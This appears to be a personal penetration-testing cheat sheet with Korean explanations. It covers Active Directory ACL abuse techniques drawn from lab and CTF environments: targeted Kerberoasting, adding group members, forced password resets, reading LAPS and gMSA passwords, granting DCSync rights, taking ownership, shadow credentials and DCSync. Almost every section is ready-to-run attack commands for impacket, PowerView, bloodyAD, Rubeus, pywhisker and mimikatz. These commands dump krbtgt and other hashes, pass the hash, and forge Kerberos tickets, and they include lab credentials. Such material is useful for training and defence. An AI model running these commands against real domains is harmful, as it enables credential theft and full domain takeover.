## Targeted Kerberoasting
- 쓰기 권한을 악용해 원래 SPN이 없던 계정에 SPN을 강제로 부여한 뒤, TGS 티켓을 요청해 해시를 탈취하고 오프라인으로 크래킹하는 기법.
- GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
- SPN을 생성한 후에 TGS를 요청하게 되는 코드가 있다.
```bash
python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose

$User = Get-DomainUser Rita

$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
```

## Add Members
- GenericAll, GenericWrite, Self, AllExtendedRights, Self-Membership

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target 'Backup Operators' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
```bash
bloodyAD -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.205.81 add groupMember 'Backup Operators' pedro

net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```powershell
Import-module .\powerview.ps1

Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
```

## Password Abuse
### ForceChangePassword
- GenericAll, AllExtendedRights, User-Force-Change-Password

#### Enueration
```bash
python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}

Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

#### Abusing
```bash
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```
rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81

rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
```
```powershell
import-module .\powerview.ps1

Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose
```
```powershell
Import-Module ActiveDirectory

Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
```

### ReadLAPSPassword
- 대상이 컴퓨터 객체일 경우에 시도.
- GenericAll
- AllExtendedRights
- ReadProperty
- ms-Mcs-AdmPwd(레거시 Microsoft LAPS가 각 컴퓨터 객체에 붙여서 로컬 관리자 계정 비밀번호를 평문 그대로 저장하는 속성)

#### Enumerating
```bash
python3 examples/dacledit.py -principal 'LAPS READERS' -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
import-module .\powerview.ps1

$group = Get-DomainGroup -Identity "LAPS Readers"

Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs  |?{$_.SecurityIdentifier -eq $group.objectsid}
```

#### Abusing
```powershell
Import-Module .\PowerView.ps1

Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}
```
```powershell
Import-Module ActiveDirectory

Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```
```bash
python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local

bloodyAD --host 10.129.9.179 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

nxc smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```

### ReadGMSAPassword
- gMSA : Windows Server가 자동으로 비밀번호를 관리해주는 특수한 서비스 계정.
- 비밀번호 관리의 번거로움과 사람이 개입해서 생기는 유출 리스크(약한 비밀번호, 평문 노출, 미교체 등)를 없애기 위해 사용.
- 비밀번호를 읽을 수 있으면 그 gMSA로 실제 인증/로그온이 가능. 
- https://github.com/rvazarkar/GMSAPasswordReader
```bash
python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01
```
```powershell
.\GMSAPasswordReader.exe --accountname apache-dev
```
```
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit

mimikatz(commandline) # privilege::debug

mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
```
```bash
netexec ldap DC.sendai.vl -u Thomas.Powell -p 0xdf0xdf.... --gmsa
```

## Write DACL
### Enumeration
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = ConvertTo-SID luna

Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```
```bash
python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123
```

### Abusing
```bash
python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync

secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81
```
```powershell
Import-Module .\PowerView.ps1

Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
```
```
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv"

mimikatz(commandline) # lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv
```
```bash
python3 addusertogroup.py -d inlanefreight.local -g "Finance" -a luna -u luna -p Moon123
```

## WriteOwner
- bloodhound로 확인

### Abusing
```bash
python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```powershell
import-module .\powerview.ps1

Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose

Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
```

## Shadow Credentials
- CA가 존재하는 상태여야만 PKINIT 인증을 지원함.
- 유저의 객체에 `msDS-KeyCredentialLink`를 확인하여 인증을 진행
- pywhisker가 공개키/개인키 쌍을 생성 후 공개키는 `msDS-KeyCredentialLink`에 추가하고 개인키는 로컬에 저장.
- 개인키를 가지고 PKINIT 인증을 시도하여 TGT를 발급받고 해시를 추출하는 공격.
- GenericAll
- GenericWrite
- WriteProperty
- AddKeyCredentialLink

### Enumeration
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity jeffry).objectsid

Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}
```
```bash
# 기존에 등록되어 있는 공개키 확인
python3 pywhisker.py -d administrator.htb -u olivia -p ichliebedich --target michael --action list

python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip 10.129.228.236 lab.local/jeffry:Music001
```

### Abusing
```powershell
.\Whisker.exe list /target:gabriel

.\Whisker.exe add /target:gabriel

.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap

.\Rubeus.exe createnetonly /program:powershell.exe /show

.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...

# clear
.\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8
```
```bash
python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add

python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache

KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel

KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
```

## Logon Scripts
- read property
- write property

### Enumeration
```bash
python3 pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids

pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'

python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip 10.129.229.224 inlanefreight.local/'david':'SecurePassDav!d5'
```
```bash
./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory --domain inlanefreight.local --server 10.129.229.224  --username 'david' --password 'SecurePassDav!d5'

./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data
```
```powershell
Import-Module .\PowerView.ps1

$DavidSID = (Get-DomainUser -Identity david).objectSID

Get-DomainObjectAcl -Identity eric -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $DavidSID}
```

### Abusing
```bash
# 쓰기 권한 폴더 찾기
smbclient //10.129.229.224/NETLOGON -U david%'SecurePassDav!d5' -c "ls"
smbcacls //10.129.229.224/NETLOGON /EricsScripts -U David%'SecurePassDav!d5'
```

## DCsync
- `MS-DRSR` 프로토콜은 DC간의 복제를 위해서 설계됨.
- DC는 요청자가 실제 DC인지 확인하지 않고 `GetChanges` + `GetChangesAll` ACE가 있는 주체의 복제 요청을 허용.
- `ntds.dit`에 저장된 모든 계정의 자격증명(해시)을 복제하게 됨.
- 물리적 파일 접근 없이 네트워크를 통해 원격으로 추출 가능.
- WriteDACL

### Abusing
```
.\mimikatz.exe

lsadump::dcsync /domain:testlab.local /user:Administrator
```
```bash
impacket-secretsdump 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'
```
